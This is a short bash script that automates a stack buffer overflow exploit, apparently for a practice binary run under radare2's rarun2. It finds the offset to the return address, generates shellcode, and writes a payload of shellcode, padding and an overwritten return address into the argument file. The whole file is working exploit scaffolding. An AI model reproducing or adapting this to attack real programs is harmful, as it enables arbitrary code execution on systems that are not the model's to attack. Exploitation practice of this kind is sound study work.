#!/bin/bash
# run in the same environment always
env > envfile
# Analyse with any arg
echo 'A' > arg1
source analyse.sh
python <<EOF  > arg1
print("A"*$BUFFERTORET+"B"*4)
EOF
# generate shellcode
./gen.sh
# Analyse with an argument of the same size as required
# that way the buffer will have the same address
source analyse.sh
python <<EOF > arg1
import struct
BUFFERTORET = $BUFFERTORET
BUFFER = struct.pack('<I',  $BUFFER)
shellcode = open("shellcode", "r").read()
print(shellcode + "A"*(BUFFERTORET - len(shellcode)) + BUFFER)
EOF
rarun2 profile.rr2
